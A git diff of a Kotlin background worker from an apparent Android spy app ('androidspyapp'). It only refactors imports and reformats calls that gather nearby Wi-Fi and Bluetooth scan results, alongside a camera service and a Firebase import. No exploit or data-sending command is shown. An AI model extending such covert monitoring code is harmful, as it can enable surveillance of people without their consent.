@@ -11,7 +11,12 @@ import android.util.Log
 import androidx.work.Worker
 import androidx.work.WorkerParameters
 import com.google.firebase.database.FirebaseDatabase
-import com.komnacki.androidspyapp.*
+import com.komnacki.androidspyapp.CameraService
+import com.komnacki.androidspyapp.MainActivity
+import com.komnacki.androidspyapp.MessageUtils
+import com.komnacki.androidspyapp.ServiceReceiver
+import com.komnacki.androidspyapp.results.BluetoothScanResult
+import com.komnacki.androidspyapp.results.WifiScanResult
 import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
 import io.reactivex.rxjava3.core.Observable
 import io.reactivex.rxjava3.disposables.Disposable
@@ -40,7 +45,12 @@ class IntervalWorker(var context: Context, workerParams: WorkerParameters): Work
                     Log.d("KK: ", "mWifiScanReceiver context!- null && mWifiManager!=null")
                     mWifiManager!!.scanResults.forEach { item ->
                         Log.d("KK: ", "wifiScanResult: " + item.SSID)
-                        mScanResults.add(WifiScanResult(context, item))
+                        mScanResults.add(
+                            WifiScanResult(
+                                context,
+                                item
+                            )
+                        )
                     }
                 }
             }
@@ -61,7 +71,12 @@ class IntervalWorker(var context: Context, workerParams: WorkerParameters): Work
                 val device: BluetoothDevice? = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                 // Add the name and address to an array adapter to show in a ListView
                 // Add the name and address to an array adapter to show in a ListView
-                mScanResultsBluetooth.add(BluetoothScanResult(context!!, device))
+                mScanResultsBluetooth.add(
+                    BluetoothScanResult(
+                        context!!,
+                        device
+                    )
+                )
             }
         }
 
